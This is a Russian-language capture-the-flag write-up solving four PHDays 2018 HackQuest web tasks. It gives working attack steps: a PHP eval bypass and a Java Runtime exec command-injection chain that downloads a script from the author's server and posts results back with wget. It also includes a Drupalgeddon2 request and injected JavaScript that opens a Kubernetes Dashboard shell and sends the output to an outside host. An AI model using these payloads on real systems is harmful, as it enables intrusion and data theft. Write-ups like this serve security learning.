# PHDays2018HackQuest

1. mnogorock

   В исходном коде страницы таска `view-source:http://172.104.137.194/` находим следующее:

   ```html
   <!-- POST,command,inform() -->
   ```

   Отправив `command=inform()` POST-методом и получаем в ответ

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 May 2018 10:23:54 GMT
   Server: Apache/2.4.18 (Ubuntu)
   Content-Length: 46
   Connection: close
   Content-Type: text/html; charset=UTF-8

   <!-- POST,command,inform() -->du u now de wei?
   ```

   После фаззинга параметра *command* понимаем, что там вайтлист по [PHP-лексемам](http://php.net/manual/ru/tokens.php) и все, что мы отправляем в *command=* попадает в *eval*. 

   С помощью доступных PHP-лексем, получим выполнение произвольного кода на сервере: 

   ```php
   array('system')[0]('cat /Le9iFudfj94Ef');
   ```



2. sincity

   Веб-сервер **Resin/4.0.55**

   Получить доступ в закрытый /dev можно при помощи обратного слеша `GET /dev\ HTTP/1.1`

   В ответе на `/dev\` находится листинг текущей директории

   ```
   array(3) {
     [0]=>
     string(9) "index.php"
     [1]=>
     string(8) "task.php"
     [2]=>
     string(17) "task.php~~~edited"
   }
   ```

   Исходники в `task.php~~~edited` 

   ```php
   <?php
   error_reporting(0);
   if(md5($_COOKIE['developer_testing_mode'])=='0e313373133731337313373133731337')
   {
    if(strlen($_GET['constr'])===4){
    	$c = new $_GET['constr']($_GET['arg']);
   	$c->$_GET['param'][0]()->$_GET['param'][1]($_GET['test']);
    }else{
    	die('Swimming in the pool after using a bottle of vodka');
    }
   }
   ?>
   ```

   Следующий запрос позволит исполнять произвольные команды на сервере:

   ```http
   GET /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=wget+http://xymfrx.ru HTTP/1.1
   Host: 172.104.154.29
   Cookie: developer_testing_mode=240610708
   ```

   Флаг находится в **/**, чтобы получить листинг корневой директории на сервере, загрузим в **/tmp** скрипт, который выполнит **ls -la /** и положит ответ в файл, далее прочитать файл можно тем же **wget**-ом. 

   Создается файл с **touch**

   ```
   /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=touch+/tmp/xymfrx_random2x
   ```

   Созданный файл заменяется на свой и делается исполняемым

   ```
   # script.sh
   #!/bin/bash

   ls -la 1>/tmp/xymfrx_ls
   ```

   ```
   /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=wget+-q+http://xymfrx.ru/script.sh+-O+/tmp/xymfrx_random2x
   ```

   ```
   /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=chmod+%2bx+/tmp/xymfrx_random2x
   ```

   Выполним скрипт

   ```
   /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=/bin/bash+/tmp/xymfrx_random2x
   ```

   Заберем ответ

   ```
   /dev\task.php?constr=Java&arg=java.lang.Runtime&param[0]=getRuntime&param[1]=exec&test=wget+http://xymfrx.ru/+--post-file=/tmp/xymfrx_random2x
   ```

   В ответе находится название файла с флагом, читаем содержимое и сдаем флаг

3. enGeeks

   При обращении к папке *http://172.104.246.110/admino4ka/img* видим редирект на другой IP. 

   ```http
   HTTP/1.1 301 Moved Permanently
   Server: nginx
   Date: Thu, 03 May 2018 09:54:51 GMT
   Content-Type: text/html; charset=iso-8859-1
   Content-Length: 240
   Connection: close
   Location: http://139.162.190.95:63425/img/
   X-Proxy-Cache: MISS

   <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
   <html><head>
   <title>301 Moved Permanently</title>
   </head><body>
   <h1>Moved Permanently</h1>
   <p>The document has moved <a href="http://139.162.190.95:63425/img/">here</a>.</p>
   </body></html>

   ```

   На этом IP размещены развернутые движки: Joomla, Wordpress и Drupal. Как к ним обращаться понятно из предыдущего хоста, ссылки на развернутые движки вида `wordpress.local` находятся в */admino4ka* и намекают на виртуальные хосты. Следуя подсказке *Drupalgeddon2 is still alive*, идем сразу в Drupal и пытаемся просплойтить Drupalgeddon2:

   ```http
   POST /user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
   Host: drupal.local:63425
   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
   Accept-Encoding: gzip, deflate
   X-Forwarded-For: 127.0.0.1
   Referer: http://drupal.local:63425/user/register
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 112
   Connection: close
   Upgrade-Insecure-Requests: 1

   form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=system&timezone[a][#lazy_builder][][]=ls
   ```

   В README.md предыдущего хоста еще одна подсказка на то, где искать флаг. Следуя ей, получим все файлы с разрешением *.jpg* из */var/www/*. Первое, что бросается в глаза, файл загруженный в блоге с Wordpress. Открываем фотографию - флаг на листке за чуваком.

   ![flag](img/engeeks.jpg)

   ​

4. Rubik

   Сайт на Wordpress-е с открытой регистрацией. 

   При открытии постов на сайте, можно заметить кнопочку **Print**, с помощью которой генерится PDF-ка с содержимым поста. 

   Первое, что приходит в голову, найти как заинжектиться в текст поста и попробовать так сгенерить PDF. Хмм. Вспоминаем, что на сайте открыта регистрация и регистрируемся.

   После реги доступна функциональность создания постов на сайте. Задача: вставить свой *javascript*-код и сгенерить с ним PDF. 

   Но вот проблема, wordpress, при создании поста, не позволяет рендерить html-теги, кроме тех, что предназначены для форматирования текста. 

   ...

   Еще до регистрации, в последнем посте можно заметить frame с плеером Youtube. Тогда можно было не обратить на это внимание, но сейчас.. 

   Пробуем вставить свой <iframe> при создании поста - и ничего!

   Пробуем снова вставить тот же frame, только вместо символов `<>` используем их html-сущности `&lt;&gt;`. И у нас получается! 

   Можем открыть свой сайт в iframe и читать произвольные файлы на сервере с помощью JS, но выкатили подсказку: *There is no need to read local files. The blog is not the only service on the host.*

   Окей. 

   Поищем что-нибудь на других портах. 

   На `127.0.0.1:8080` находим Kubernetes Dashboard. 

   >**Kubernetes Dashboard** is a general purpose, web-based UI for Kubernetes clusters. It allows users to manage applications running in the cluster and troubleshoot them, as well as manage the cluster itself.

   Забираем JS-файл, который загружается на странице `http://127.0.0.1:8080/static/app.fe2776ce.js` и копаемся в нем. 

   Спустя немного времени, натыкаемся на API метод для открытия шелла на тачке. 

   ```javascript
   aa.onTerminalReady = function() {
       this.io = this.b.io.push();
       this.j("api/v1/pod/" + this.c.objectNamespace + "/" + this.podName + "/shell/" + this.container).get({}, this.ud.bind(this))
   };
   aa.ud = function(a) {
       this.a = new SockJS("api/sockjs?" + a.id);
       this.a.onopen = this.pd.bind(this, a);
       this.a.onmessage = this.od.bind(this);
       this.a.onclose = this.nd.bind(this)
   };
   ```

   Для того, чтобы открыть шелл, нужно узнать какой у нее namespace, pod и имя контейнера.

   > **Namespace**: Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called [namespaces](https://kubernetes.io/docs/tasks/administer-cluster/namespaces/). They let you partition resources into logically named groups.

   > **Pod**: A *pod* (as in a pod of whales or pea pod) is a group of one or more containers (such as Docker containers), with shared storage/network, and a specification for how to run the containers.

   Узнаем, что в неймспейсе `default` находится pod с названием `flagggg-d54f5c54f-nvb26` и с именем контейнера `flag`. 

   Обратившись к API для открытия терминала, получаем **id** для обращения с ним по веб-сокетам. Остается открыть соединение и отправить команду для исполнения.

   ​
   Прошло пару часов пока я не осознал, что пора ставить себе *minikube*, потому что тех действий, что я выполнял, было недостаточно. 

   После установки, идем в Kubernetes Dashboard и следим за тем, какие запросы идут для открытия шелла. Правим скрипт и параллельно тестируем его на локальном Dashboard-е. Несколько раз спотыкаемся об экранирование и скрипт готов. 

   ```html
   xymfrx

   <script src="http://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js"></script>

   <script>

   function reqListener () {

       var encoded = encodeURI(this.responseText);
       var b64 = btoa(this.responseText);
       var raw = this.responseText;
   	
   	var json = JSON.parse(raw);

   	var sock = new WebSocket("ws://127.0.0.1:8080/api/sockjs/418/1fssnuot/websocket?" + json.id);
   	//var sock = new SockJS("http://127.0.0.1:8080/api/sockjs/418/1fssnuot/websocket?" + json.id);

   	sock.onopen = function() {
   		sock.send("[\"{\\\"Op\":\\\"bind\\\",\\\"SessionID\\\":\\\"" + json.id + "\\\"}\"]");
   		sock.send("[\"{\\\"Op\\\":\\\"resize\\\",\\\"Cols\\\":120,\\\"Rows\\\":33}\"]");
   		sock.send("[\"{\\\"Op\\\":\\\"stdin\\\",\\\"Data\\\":\\\"ls\r\\\"}\\\"]");

   		var oReq223 = new XMLHttpRequest();
   		oReq223.open("GET","http://xymfrx.ru/?otkroy_padla",true);
   		oReq223.send();
   	};

   	sock.onmessage = function(e) {
   		var oReq223 = new XMLHttpRequest();
   		oReq223.open("GET","http://xymfrx.ru/?ale_garazh=" + btoa(e.data),true);
   		oReq223.send();
   	};

   	sock.onclose = function(event) {
   		var oReq223 = new XMLHttpRequest();
   		oReq223.open("GET","http://xymfrx.ru/?close="+event.code+"&asd="+event.reason,true);
   		oReq223.send();
   	};

   	sock.onerror = function(error){
   		var oReq223 = new XMLHttpRequest();
   		oReq223.open("GET","http://xymfrx.ru/error?" + error.message,true);
   		oReq223.send();
   	};

   } 

   var oReq = new XMLHttpRequest(); 
   oReq.addEventListener("load", reqListener); 
   oReq.open("GET", "http://127.0.0.1:8080/api/v1/pod/default/flagggg-d54f5c54f-nvb26/shell/flag");
   oReq.send();

   </script>
   ```
   ​

   Считываем ответы у себя в логах и радуемся!

5. wowsuchchain

   Coming soon!
